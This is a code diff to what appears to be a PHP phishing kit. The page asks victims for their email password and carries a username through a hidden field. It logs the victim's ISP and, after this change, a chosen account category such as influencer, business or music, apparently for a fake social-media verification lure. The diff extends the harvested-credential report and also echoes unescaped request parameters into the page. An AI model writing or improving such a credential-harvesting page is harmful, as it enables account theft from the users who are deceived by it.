@@ -46,6 +46,8 @@ if(isset($_GET['comen']))
     
     \$_ISP           : " . $json['isp'] . "
     
+    \$_KATEGORI      : " . $_GET['category'] . "
+    
     
     
     
@@ -115,6 +117,20 @@ if(isset($_GET['comen']))
             </div>
             <div class="mb-3">
                 <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholder="Email Password" required autocomplete="no">
+            </div>
+            <div class="mb-3">
+                <select name="category" id="category" class="form-input">
+                    <option value="sport">Sport</option>
+                    <option value="news/media">News/media</option>
+                    <option value="state-and-politics">State and politics</option>
+                    <option value="music">Music</option>
+                    <option value="fashion">Fashion</option>
+                    <option value="fun">Fun</option>
+                    <option value="influencer-blogger">Influencer/blogger</option>
+                    <option value="computer-player">Computer Player</option>
+                    <option value="business">Global business/brand/establishment</option>
+                    <option value="other">Other</option>
+                </select>
             </div>
             <input hidden type="text" name="username" value="<?= $_GET['username']; ?>">
             <input hidden type="number" name="comen" value="1">
